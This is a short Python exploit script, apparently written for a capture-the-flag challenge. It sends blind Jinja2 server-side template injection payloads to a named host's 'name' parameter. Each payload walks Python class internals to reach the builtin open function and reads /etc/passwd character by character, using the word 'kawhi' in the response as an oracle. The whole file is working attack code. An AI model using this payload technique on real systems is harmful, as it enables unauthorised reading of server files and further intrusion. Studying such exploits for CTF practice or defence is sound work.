# -*- coding: utf-8 -*-
import requests

url = 'jp.zoolab.org:10051/?name='

def check(payload):
    r = requests.get(url+payload).content
    return 'kawhi' in r

password = ''
s = r'0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ!"$\'()*+,-./:;<=>?@[\\]^`{|}~\'"_%'

for i in range(0,100):
    for c in s:
        payload = '{% if ().__class__.__bases__[0].__subclasses__()[40].__init__.__globals__.__builtins__.open("/etc/passwd").read()['+str(i)+':'+str(i+1)+'] == "' + c + '" %}kawhi{% endif %}'
        if check(payload):
            password += c
            break
    print(password)